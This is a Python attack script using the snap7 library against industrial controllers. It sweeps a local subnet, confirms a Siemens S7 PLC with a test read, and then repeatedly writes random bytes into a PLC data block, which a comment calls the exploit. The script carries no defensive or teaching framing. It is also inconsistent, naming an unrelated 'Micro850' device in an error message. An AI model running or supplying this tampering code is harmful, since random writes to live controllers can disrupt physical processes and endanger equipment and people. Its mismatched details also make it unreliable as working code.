import snap7
import socket
import struct
import time
import random

# Configuration
PLC_IP_RANGE = "192.168.1.0/24" # Replace with your network's IP range
TARGET_DB = 1  # Data Block number (adjust as needed)
START_ADDRESS = 0  # Starting byte address in the DB (adjust as needed)
NUM_BYTES = 4     # Number of bytes to write (adjust as needed) - Example: INT, REAL
POLL_INTERVAL = 0.1 # Seconds between write attempts
NUM_ATTEMPTS = 100   # Number of write attempts

# Functions to find the PLC IP address
def ip_to_integer(ip_address):
    """Converts an IP address to an integer."""
    packed_ip = socket.inet_aton(ip_address)
    return struct.unpack("!I", packed_ip)[0]

def integer_to_ip(ip_int):
    """Converts an integer to an IP address."""
    packed_ip = struct.pack("!I", ip_int)
    return socket.inet_ntoa(packed_ip)

def ping(host):
    """Pings a host and returns True if successful, False otherwise."""
    try:
        socket.setdefaulttimeout(0.5)  # Set a timeout for the ping
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, 80))  # Try connecting to port 80 (HTTP)
        s.close()
        return True
    except socket.error:
        return False

def find_plc_ip(ip_range):
    """Scans an IP range and returns the IP address of the PLC (if found)."""
    try:
        ip_prefix, subnet_mask = ip_range.split('/')
        subnet_bits = int(subnet_mask)
        ip_int = ip_to_integer(ip_prefix)
        num_addresses = 2**(32 - subnet_bits)

        for i in range(1, num_addresses - 1): # Exclude network and broadcast address
            test_ip_int = ip_int + i
            test_ip = integer_to_ip(test_ip_int)
            print(f"Pinging {test_ip}...") #optional: Show the progress
            if ping(test_ip):
                print(f"Potential PLC IP found: {test_ip}")
                # Add further checks here to confirm it's the PLC.
                # This could involve attempting a simple S7 connection.

                try:
                    plc = snap7.client.Client()
                    plc.connect(test_ip, 0, 2)  # Rack 0, Slot 2 (common values)
                    #Attempt to read data to confirm that the PLC is at the found IP.  For instance, read 2 bytes from DB1, address 0.
                    data = plc.db_read(1, 0, 2)
                    plc.disconnect() #disconnect now, will reconnect when running exploit.
                    print(f"Confirmed PLC IP: {test_ip}")
                    return test_ip  # Return the IP if ping is successful and simple S7 connection works.
                except Exception as e:
                    print(f"Ping successful, but not a Micro850 PLC: {e}")
            else:
                print(f"Ping unsuccessful: {test_ip}")

        print("PLC not found in specified IP range.")
        return None
    except Exception as e:
        print(f"Error during IP scan: {e}")
        return None

def brute_force_io(plc_ip, db_number, start_address, num_bytes, num_attempts, poll_interval):
    """Brute forces an I/O point by repeatedly writing random data to it."""
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, 0, 2)  # Rack 0, Slot 2 (common values)
        print(f"Connected to PLC at {plc_ip}")

        for i in range(num_attempts):
            # Generate random data
            random_data = bytearray(random.getrandbits(8) for _ in range(num_bytes))

            # Write the data to the PLC
            plc.db_write(db_number, start_address, random_data)

            print(f"Attempt {i+1}: Wrote {random_data.hex()} to DB{db_number}.DBB{start_address}")
            time.sleep(poll_interval)

        plc.disconnect()
        print("Brute force complete.  PLC disconnected.")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'plc' in locals() and plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC due to error.")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip(PLC_IP_RANGE)

    if plc_ip:
        print(f"Using PLC IP: {plc_ip}")
        brute_force_io(plc_ip, TARGET_DB, START_ADDRESS, NUM_BYTES, NUM_ATTEMPTS, POLL_INTERVAL)
    else:
        print("PLC IP not found. Exiting.")